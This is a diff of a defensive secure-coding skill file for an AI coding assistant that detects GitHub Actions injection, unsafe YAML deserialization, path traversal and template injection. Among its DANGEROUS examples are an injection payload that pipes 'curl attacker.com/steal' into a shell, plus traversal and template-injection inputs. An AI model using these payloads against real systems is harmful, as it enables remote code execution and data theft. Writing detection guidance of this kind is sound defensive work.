@@ -1,189 +1,86 @@
 ---
-description: Real-time security pattern detector based on Anthropic's official security-guidance plugin. Use proactively when writing code to detect command injection, XSS, unsafe deserialization, and dynamic code execution risks. Identifies dangerous patterns BEFORE they're committed.
-allowed-tools: Read, Grep, Glob
-user-invocable: false
+description: Non-obvious security pattern detection -- GitHub Actions injection, unsafe deserialization, path traversal edge cases. Activates proactively when writing code to catch commonly missed vulnerabilities.
+user-invokable: false
 ---
 
-# Security Pattern Detector Skill
+# Security Pattern Detector
 
-## Overview
+## GitHub Actions Injection (Most Commonly Missed)
 
-This skill provides real-time security pattern detection based on Anthropic's official security-guidance plugin. It identifies potentially dangerous coding patterns BEFORE they're committed.
+User-controlled GitHub event data injected directly into `run:` blocks executes arbitrary shell commands.
 
-## Scope Boundaries
-
-This skill is a **REAL-TIME DETECTOR**. Activates proactively when writing code. Detects: command injection, XSS, unsafe deserialization, dynamic code execution.
-
-- For comprehensive security audits → use `/security`
-
-## Detection Categories
-
-### 1. Command Injection Risks
-
-**GitHub Actions Workflow Injection**
 ```yaml
-# DANGEROUS - User input directly in run command
+# DANGEROUS - Attacker sets issue title to: "; curl attacker.com/steal | sh; #
 run: echo "${{ github.event.issue.title }}"
 
-# SAFE - Use environment variable
+# DANGEROUS - Same vector via PR title, branch name, commit message
+run: echo "${{ github.event.pull_request.title }}"
+run: git checkout "${{ github.head_ref }}"
+run: echo "${{ github.event.comment.body }}"
+
+# SAFE - Pass through environment variable (shell escaping applies)
 env:
   TITLE: ${{ github.event.issue.title }}
 run: echo "$TITLE"
+
+# SAFE - Use an action input instead of inline expression
+- uses: my-action@v1
+  with:
+    title: ${{ github.event.issue.title }}
 ```
 
-**Node.js Child Process Execution**
+**All injectable contexts** (never use directly in `run:`):
+`github.event.issue.title`, `github.event.issue.body`, `github.event.pull_request.title`,
+`github.event.pull_request.body`, `github.event.comment.body`, `github.head_ref`,
+`github.event.pull_request.head.ref`, `github.event.commits[*].message`
 
-Dangerous: passing unsanitized user input to shell commands via `child_process` methods with string arguments.
+## Pattern-to-Severity Mapping
 
-```typescript
-// SAFE - Array arguments, no shell
-execFile('ls', [sanitizedPath]);
-spawn('ls', [sanitizedPath], { shell: false });
-```
+| Pattern | Category | Severity | Why Commonly Missed |
+|---------|----------|----------|-------------------|
+| `${{ github.event.* }}` in `run:` | GH Actions Injection | CRITICAL | Looks like normal templating |
+| `pickle.loads(untrusted)` | Deserialization RCE | CRITICAL | "It's just data loading" |
+| `yaml.load()` without `Loader=SafeLoader` | Deserialization RCE | CRITICAL | Default PyYAML is unsafe |
+| `eval('(' + json + ')')` | Code Execution | CRITICAL | Legacy JSON parsing pattern |
+| `new Function(userInput)` | Code Execution | CRITICAL | Less known than eval() |
+| `path.join(base, userInput)` without validation | Path Traversal | HIGH | join doesn't prevent `../` |
+| `child_process.exec(template)` | Command Injection | CRITICAL | String form invokes shell |
+| `dangerouslySetInnerHTML` without DOMPurify | XSS | HIGH | React devs assume it's safe enough |
+| `element.innerHTML = userInput` | XSS | HIGH | Seems harmless for "display" |
+| `subprocess.run(cmd, shell=True)` | Command Injection | CRITICAL | Convenient but dangerous |
 
-**Python OS Commands**
+## Non-Obvious Patterns
 
-Dangerous: Python `os.system` or `subprocess.call` with `shell=True` and user-controlled strings.
-
+**Unsafe deserialization (Python):**
 ```python
+# DANGEROUS - yaml.load() executes arbitrary Python by default
+import yaml
+data = yaml.load(user_input)              # RCE via !!python/object tag
+
 # SAFE
-subprocess.run(['grep', sanitized_input, 'file.txt'], shell=False)
+data = yaml.safe_load(user_input)         # Only loads basic types
+data = yaml.load(user_input, Loader=yaml.SafeLoader)
 ```
 
-### 2. Dynamic Code Execution
-
-**JavaScript eval-like Patterns**
-
-Dangerous: passing user-controlled strings to `eval()`, `new Function()`, `setTimeout(string)`, or `setInterval(string)` — all execute arbitrary code.
-
+**Path traversal edge cases:**
 ```typescript
-// SAFE - Use parsed data, not code
-const config = JSON.parse(configString);
+// DANGEROUS - path.join does NOT prevent traversal
+const filePath = path.join('./uploads', userInput);
+// userInput = "../../etc/passwd" -> "./etc/passwd" (traversal succeeds)
+
+// SAFE - Resolve and verify prefix
+const resolved = path.resolve('./uploads', userInput);
+if (!resolved.startsWith(path.resolve('./uploads') + path.sep)) {
+    throw new Error('Path traversal detected');
+}
 ```
 
-### 3. DOM-based XSS Risks
-
-**React dangerouslySetInnerHTML**
-```tsx
-// DANGEROUS - Renders arbitrary HTML
-<div dangerouslySetInnerHTML={{ __html: userContent }} />
-
-// SAFE - Use proper sanitization
-import DOMPurify from 'dompurify';
-<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userContent) }} />
-```
-
-**Direct DOM Manipulation**
-```typescript
-// DANGEROUS
-element.innerHTML = userInput;
-document.write(userInput);
-
-// SAFE
-element.textContent = userInput;
-element.innerText = userInput;
-```
-
-### 4. Unsafe Deserialization
-
-**Python Pickle**
+**Template injection (server-side):**
 ```python
-# DANGEROUS - Pickle can execute arbitrary code
-import pickle
-data = pickle.loads(user_provided_bytes)
+# DANGEROUS - User input in Jinja2 template string
+template = Template(f"Hello {user_input}")  # SSTI if user_input = "{{ config }}"
 
-# SAFE - Use JSON for untrusted data
-import json
-data = json.loads(user_provided_string)
+# SAFE - User input as template variable only
+template = Template("Hello {{ name }}")
+template.render(name=user_input)
 ```
-
-**JavaScript unsafe deserialization**
-
-Dangerous: using `eval('(' + jsonString + ')')` to parse JSON — executes arbitrary code.
-
-```typescript
-// SAFE
-const obj = JSON.parse(jsonString);
-```
-
-### 5. SQL Injection
-
-**String Interpolation in Queries**
-```typescript
-// DANGEROUS
-const query = `SELECT * FROM users WHERE id = ${userId}`;
-db.query(`SELECT * FROM users WHERE name = '${userName}'`);
-
-// SAFE - Parameterized queries
-const query = 'SELECT * FROM users WHERE id = $1';
-db.query(query, [userId]);
-```
-
-### 6. Path Traversal
-
-**Unsanitized File Paths**
-```typescript
-// DANGEROUS
-const filePath = `./uploads/${userFilename}`;
-fs.readFile(filePath); // User could pass "../../../etc/passwd"
-
-// SAFE
-const safePath = path.join('./uploads', path.basename(userFilename));
-if (!safePath.startsWith('./uploads/')) throw new Error('Invalid path');
-```
-
-## Pattern Detection Rules
-
-| Pattern | Category | Severity | Action |
-|---------|----------|----------|--------|
-| eval with user input | Code Execution | CRITICAL | Block |
-| Function constructor with user input | Code Execution | CRITICAL | Block |
-| dangerouslySetInnerHTML | XSS | HIGH | Warn |
-| innerHTML assignment | XSS | HIGH | Warn |
-| document.write with user input | XSS | HIGH | Warn |
-| child_process exec with string concat | Command Injection | CRITICAL | Block |
-| spawn with shell:true | Command Injection | HIGH | Warn |
-| pickle.loads with untrusted data | Deserialization | CRITICAL | Warn |
-| github.event context in run | GH Actions Injection | CRITICAL | Warn |
-| Template literal in SQL | SQL Injection | CRITICAL | Block |
-
-## Response Format
-
-When detecting a pattern:
-
-```markdown
-⚠️ **Security Warning**: [Pattern Category]
-
-**File**: `path/to/file.ts:123`
-**Pattern Detected**: [description of the dangerous pattern]
-**Risk**: Remote Code Execution - Attacker-controlled input can execute arbitrary JavaScript
-
-**Recommendation**:
-1. Never use dynamic code execution with user input
-2. Use JSON.parse() for data parsing
-3. Use safe alternatives for dynamic behavior
-
-**Safe Alternative**:
-```typescript
-// Use JSON.parse instead of dynamic execution:
-const data = JSON.parse(userInput);
-```
-```
-
-## Integration with Code Review
-
-This skill should be invoked:
-1. During PR reviews when new code is written
-2. As part of security audits
-3. When flagged by the code-reviewer skill
-
-## False Positive Handling
-
-Some patterns may be false positives:
-- dangerouslySetInnerHTML with DOMPurify is safe
-- Dynamic code execution in build tools (not user input) may be acceptable
-- Child process execution with hardcoded commands is lower risk
-
-Always check the context before blocking.
-
-
